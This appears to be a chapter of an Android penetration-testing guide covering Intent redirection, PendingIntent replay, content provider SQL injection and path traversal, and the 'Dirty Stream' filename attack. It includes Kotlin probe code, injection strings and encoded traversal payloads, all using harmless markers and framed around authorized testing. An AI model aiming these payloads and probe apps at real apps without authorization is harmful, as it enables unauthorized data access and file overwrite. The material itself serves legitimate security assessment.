# Advanced IPC and Content Providers

## Scope and Entry Criteria

* **Basic commands:** [Component Testing](component-testing.md) for Intent delivery, Messenger, provider reads/CRUD/scanners.
* **Here:** forwarding, results, delegated authority, Binder identity, provider query/path/grant boundaries.
* **Start with:** reachable operation, authorized baseline, observed protocol/URI, disposable records.
* **Client:** compatible companion app when CLI cannot express the interaction.
* **Track:** confirmed / rejected under tested conditions / blocked / untested.

## Intent, Result, and Binder Boundaries

* **Companion setup:** in Android Studio create a Kotlin **Empty Views Activity** project with package `com.example.ipcprobe` and an AndroidX `ComponentActivity`/`AppCompatActivity`. Use its generated launcher Activity as the test Activity and keep it exported for ADB launch. Place the selected snippet in its Activity source; do not add these snippets to the target app. If using a different package, update the component names, manifest entries and provider authority consistently. Android 11+ package-visibility rules may require a matching `<queries>` declaration when the companion queries or resolves the target.
* **Companion Activity, Kotlin:** send a nested explicit Intent using the forwarding component and extra name found in the target code. Place this in the companion Activity's `onCreate` after `super.onCreate(...)`.
	* ```kotlin
		val destination = android.content.Intent().setComponent(
				android.content.ComponentName("<target-package>", "<destination-activity>"))
		val forwarded = android.content.Intent().setComponent(
				android.content.ComponentName("<target-package>", "<forwarding-activity>"))
				.putExtra("<observed-nested-intent-extra>", destination)
		startActivity(forwarded)
		```
* **Build/install:** from the companion project root, run the matching host command.

{% tabs %}
{% tab title="Linux" %}
* ```bash
  ./gradlew installDebug
  ```
{% endtab %}
{% tab title="Windows" %}
* ```powershell
  .\gradlew.bat installDebug
  ```
{% endtab %}
{% endtabs %}

* **Launch and observe, host terminal:** substitute the installed companion package and Activity. Inspect `IPCProbe` Logcat output for result callbacks and provider probes; compare direct target access with the [activity launch templates](component-testing.md#test-direct-access-and-inputs).
	* ```text
		adb shell am start -n '<companion-package>/<test-activity>'
		adb logcat -s IPCProbe:I
		```
* **Activity results, AndroidX companion Activity property:** register before the Activity is started; launch the observed flow from `onCreate` or a test button.
	* ```kotlin
		private val resultProbe = registerForActivityResult(
				androidx.activity.result.contract.ActivityResultContracts.StartActivityForResult()
		) { result ->
				android.util.Log.i("IPCProbe", "code=${result.resultCode}; uri=${result.data?.data}; keys=${result.data?.extras?.keySet()}")
		}
		```
* **Invoke from the Activity:**
	* ```kotlin
		resultProbe.launch(android.content.Intent().setComponent(
				android.content.ComponentName("<target-package>", "<result-activity>")))
		```
* **Bound interfaces:** use the target's generated AIDL/client interface or the [Messenger command variants](component-testing.md#test-a-bound-service); ADB cannot encode arbitrary Binder transactions.

### PendingIntent Fill-In and Replay

* **Input:** obtain the actual target-created `PendingIntent` through the exposed callback/result/share flow. Creating a token in your companion only tests your companion. Add the snippet to the receiving companion Activity's `onCreate()` when the token arrives in its launch Intent. For an Activity result, read the token from `result.data` in the result callback instead of the Activity's launch `intent`; for a later `onNewIntent` delivery, use its Intent argument. Substitute the actual extra name and a destination of the same component type as the token (activity/service/broadcast).
	* ```kotlin
		val token = intent.getParcelableExtra<android.app.PendingIntent>("REPLACE_TOKEN_EXTRA")
		    ?: error("Target PendingIntent missing")
		val fillIn = android.content.Intent().apply {
		    component = android.content.ComponentName("REPLACE_TARGET_PACKAGE", "REPLACE_COMPONENT")
		    putExtra("REPLACE_OBJECT_EXTRA", "REPLACE_ACCOUNT_B_RECORD_ID")
		}
		try {
		    token.send(this, 0, fillIn)
		} catch (error: android.app.PendingIntent.CanceledException) {
		    android.util.Log.i("IPCProbe", "Token canceled: $error")
		}
		```
* Test destination filling and extra substitution independently. Immutable tokens ignore fill-in changes; existing destination fields normally cannot be replaced unless creation flags permit it. Background-launch restrictions can also block execution.
* **Replay:** retain the same token object, send it once normally, then repeat after use/logout/account switch. Do not fetch a fresh token for a replay test.
* **Confirm:** the target's authority reaches an otherwise inaccessible operation or B's record, or repeats a one-time action. Successful `send()` alone is not proof; compare a direct companion call to the same destination.

<table><thead><tr><th width="172">Surface</th><th width="274">Test</th><th>Confirm</th></tr></thead><tbody><tr><td>Intent redirection</td><td>Nested Intent/<code>intent:</code> through exported forwarder; vary destination/action/data/grants</td><td>Protected operation reached using intermediary authority</td></tr><tr><td>Activity results</td><td>Companion launches for result; logged-out/cancel paths</td><td>Sensitive extras/grants returned before authorization</td></tr><tr><td>Mutable PendingIntent</td><td>Obtain shared token; fill unspecified fields, especially empty/implicit base Intent</td><td>Unintended operation as creator; mutability alone is not a flaw</td></tr><tr><td>PendingIntent replay / reuse</td><td>Repeat owned token after use, logout, privilege change</td><td>Unauthorized repeat action; missing <code>FLAG_ONE_SHOT</code> alone is not a flaw</td></tr><tr><td>Bound service / AIDL / Messenger</td><td>Known methods, owned records, callbacks, returned Binder handles</td><td>Per-method caller/role/object checks; binding alone is insufficient</td></tr><tr><td>Binder identity handling</td><td>Checks, <code>clearCallingIdentity</code>, async handoff, restoration</td><td>Authorization uses intended external caller, not substituted service identity</td></tr><tr><td>Implicit / sticky / ordered broadcasts</td><td>Recipients, permissions/package, results, registration flags</td><td>Unintended reception/injection under actual platform restrictions</td></tr><tr><td>Task transitions</td><td>Launcher, recents, reparenting, <code>singleTask</code></td><td>Unintended task/UI transition; assess platform advisories separately</td></tr></tbody></table>

* **Malformed inputs:** missing extras, wrong types, short invalid URIs; agree size/attempt limits.
* **No flooding:** reproduce bounded failures; a crash alone is not code execution.

## Provider Operation Matrix

* **Companion Activity source, Kotlin:** place this code in an Activity method or test button callback. It queries one known item under the companion UID; inspect file metadata and the returned stream independently.
	* ```kotlin
		val uri = android.net.Uri.parse("<owned-item-content-uri>")
		contentResolver.query(uri, arrayOf("<known-column>"), null, null, null)?.use { cursor ->
				android.util.Log.i("IPCProbe", "rows=${cursor.count}; columns=${cursor.columnNames.joinToString()}")
		}
		```
* **Companion Activity source, Kotlin:** place this code in an Activity method or test button callback. It requires a granted file-serving URI, not a database route.
	* ```kotlin
		val fileUri = android.net.Uri.parse("<granted-test-file-uri>")
		contentResolver.openInputStream(fileUri)?.use { stream ->
				val marker = ByteArray(64)
				android.util.Log.i("IPCProbe", "readBytes=${stream.read(marker)}")
		}
		```
* Build and invoke through the companion commands above; compare access before the grant, after sharing, and after revocation/logout. Basic route/CRUD variants remain in [Component Testing](component-testing.md#content-providers).

* Map each authority's documented/code-discovered URI routes, operations, permissions, accounts, and data owners.
* Compare an unauthorized caller with an authorized control.

<table><thead><tr><th width="182">Surface</th><th>Test</th><th>Confirm / Caveat</th></tr></thead><tbody><tr><td><code>query</code>, <code>update</code>, <code>delete</code></td><td>Selection, bound arguments, permitted rows</td><td>Parameters do not protect raw SQL/identifiers; disposable mutations only</td></tr><tr><td>Projection / sorting / grouping</td><td>Columns, expressions, order/limit</td><td>Forbidden test column/route accessible; avoid unnecessary dumps</td></tr><tr><td><code>openFile</code> / typed assets</td><td>Decoding, canonical paths, modes, symlinks/races</td><td>Harmless file stays inside root; prefix checks respect path boundaries</td></tr><tr><td>FileProvider</td><td>Roots, URI, read/write/prefix/persistable grants</td><td>Actual grant scope/lifetime; <code>grantUriPermissions=true</code> is not blanket access</td></tr><tr><td>Route variants / undocumented paths</td><td>Matcher, encoded segments, trailing separators, alternate operations</td><td>Consistent authorization after normalization; establish valid routes first</td></tr><tr><td>Family apps / shared UID</td><td>Signing/install prerequisites, permissions, caller UID</td><td>Demonstrate access; one compromised app does not imply universal access</td></tr><tr><td><code>notifyChange</code> / ContentObserver</td><td>URI contents, permissions, registration/delivery</td><td>Unauthorized observer receives sensitive data; not an unrestricted broadcast</td></tr><tr><td>Malformed requests</td><td>Bounded invalid selection, URI, offsets, types</td><td>Rejection/crash and recovery; no repeated DoS</td></tr></tbody></table>

## Provider Injection and File Traversal

* **Selection argument injection:** these are string payloads, not scripts. In the Drozer shell, use the [provider query command](component-testing.md#test-scoped-reads); keep the observed URI, projection and `--selection` template, and replace only one `--selection-args` value per run with a code-discovered string-valued field. Changing the SQL selection template instead can test an intentionally supported query language.
	* ```text
		REPLACE_A_VALUE'
		REPLACE_A_VALUE' OR id=REPLACE_B_NUMERIC_ID --
		REPLACE_A_VALUE' AND '1'='2
		```
* Replace `id` and the value type according to the actual query construction. **Confirm:** a quoted argument changes query logic and returns a forbidden known row or enables an unauthorized operation. An error alone is a lead; a bound argument returning no row is expected.
* **File-route traversal:** put a marker outside the intended exposed root but within a path readable by the provider's UID. In the Drozer shell, use the [file-read command](component-testing.md#test-scoped-reads), replacing the route/path portion of the observed content URI with one candidate per run. These are path values, not commands or scripts.
	* ```text
		../marker-outside-root.txt
		%2e%2e%2fmarker-outside-root.txt
		..%252fmarker-outside-root.txt
		```
* **Confirm:** the caller reads the marker outside the configured share root. Match the app's actual decoding layers; a nonexistent path, shell-UID denial or permission failure does not isolate canonical-path validation.

## Dirty Stream: Untrusted Provider Metadata

* **Companion provider source (Kotlin):** create `app/src/main/java/com/example/ipcprobe/ProbeProvider.kt` in the companion Android test app, matching the package declaration. Begin with `dirty-stream-marker.txt`, then change `displayName` to `../files/dirty-stream-marker.txt` or the relative path derived from the consumer's actual import directory. The provider returns the same marker data.
	* ```kotlin
		package com.example.ipcprobe

		class ProbeProvider : android.content.ContentProvider() {
		    private val displayName = "../files/dirty-stream-marker.txt"
		    private val marker get() = java.io.File(requireNotNull(context).filesDir, "source.txt")
		    override fun onCreate(): Boolean {
		        marker.writeText("dirty-stream-probe")
		        return true
		    }
		    override fun getType(uri: android.net.Uri): String = "text/plain"
		    override fun query(uri: android.net.Uri, projection: Array<out String>?,
		        selection: String?, selectionArgs: Array<out String>?, sortOrder: String?
		    ): android.database.Cursor {
		        val columns = projection ?: arrayOf(
		            android.provider.OpenableColumns.DISPLAY_NAME, android.provider.OpenableColumns.SIZE)
		        return android.database.MatrixCursor(columns).apply {
		            addRow(columns.map { column -> when (column) {
		                android.provider.OpenableColumns.DISPLAY_NAME -> displayName
		                android.provider.OpenableColumns.SIZE -> marker.length()
		                else -> null
		            } }.toTypedArray())
		        }
		    }
		    override fun openFile(uri: android.net.Uri, mode: String): android.os.ParcelFileDescriptor =
		        android.os.ParcelFileDescriptor.open(marker, android.os.ParcelFileDescriptor.MODE_READ_ONLY)
		    override fun insert(uri: android.net.Uri, values: android.content.ContentValues?): android.net.Uri? = null
		    override fun update(uri: android.net.Uri, values: android.content.ContentValues?,
		        selection: String?, selectionArgs: Array<out String>?): Int = 0
		    override fun delete(uri: android.net.Uri, selection: String?, selectionArgs: Array<out String>?): Int = 0
		}
		```
* **Companion manifest (XML):** add this element inside the companion app's `<application>` in `app/src/main/AndroidManifest.xml`; keep the authority synchronized with the content URI below.
	* ```xml
		<provider xmlns:android="http://schemas.android.com/apk/res/android"
		    android:name="com.example.ipcprobe.ProbeProvider"
		    android:authorities="com.example.ipcprobe.files"
		    android:exported="false"
		    android:grantUriPermissions="true" />
		```
* **Companion Activity source (Kotlin):** run this from the companion Activity's `onCreate()` or a test button callback. It sends the URI as its owning provider app. Replace the consumer package and MIME type with the observed import contract; an `ACTION_OPEN_DOCUMENT` flow needs its matching result handler instead of `ACTION_SEND`.
	* ```kotlin
		val stream = android.net.Uri.parse("content://com.example.ipcprobe.files/marker")
		startActivity(android.content.Intent(android.content.Intent.ACTION_SEND).apply {
		    type = "text/plain"
		    setPackage("REPLACE_CONSUMER_PACKAGE")
		    putExtra(android.content.Intent.EXTRA_STREAM, stream)
		    clipData = android.content.ClipData.newRawUri("probe", stream)
		    addFlags(android.content.Intent.FLAG_GRANT_READ_URI_PERMISSION)
		})
		```
* **Host terminal:** from the companion project root, use the existing [build and launch commands](#intent-result-and-binder-boundaries); the wrapper differs by host OS.
{% tabs %}
{% tab title="Linux" %}
* ```bash
	./gradlew installDebug
	```
{% endtab %}
{% tab title="Windows" %}
* ```powershell
	.\gradlew.bat installDebug
	```
{% endtab %}
{% endtabs %}
* **ADB launch alternative:** the ADB command is unchanged on Linux and Windows. Use an existing file URI accessible to the shell with permission to grant it onward. Replace MIME type, URI and consumer package with the observed import contract.
	* ```text
		adb shell am start -a android.intent.action.SEND -t '<observed-mime-type>' --eu android.intent.extra.STREAM '<test-provider-content-uri>' --grant-read-uri-permission -p '<consumer-package>'
		```
* The command triggers the consumer; it does not create the provider or give the shell ownership of another app's URI. For the non-exported companion provider above, send from the companion Activity. A URI-grant rejection is a caller-access failure, not evidence that the consumer validates filenames.
* **Confirm:** the consumer writes `dirty-stream-probe` outside the intended import directory or overwrites the designated marker file. Resolve the actual destination through accessible app files or an observed file-write hook; displaying the supplied filename does not prove a write escaped the directory.

1. **Find consumer:** reachable import/share/picker; reads display name, `_data`, size, MIME, or URI segment.
2. **Trace destination:** remote metadata used as a local path versus safe generated name.
3. **Test:** companion provider + harmless marker + controlled metadata; agreed disposable destination only.
4. **Capture:** URI/metadata, resolved path, write result, user interaction; prove unintended write separately from execution/token theft.
5. **Verify fix:** safe names, canonical containment, overwrite/race resistance.

* **Dirty Stream is not CVE-2024-0044:** that CVE concerns platform `run-as`/installer metadata, with different prerequisites and patches.
* Reference: [Microsoft Dirty Stream research](https://www.microsoft.com/en-us/security/blog/2024/05/01/dirty-stream-attack-discovering-and-mitigating-a-common-vulnerability-pattern-in-android-apps/).
* Reference: [Android untrusted provider filenames](https://developer.android.com/privacy-and-security/risks/untrustworthy-contentprovider-provided-filename).
* Reference: [Android intent redirection](https://developer.android.com/privacy-and-security/risks/intent-redirection).
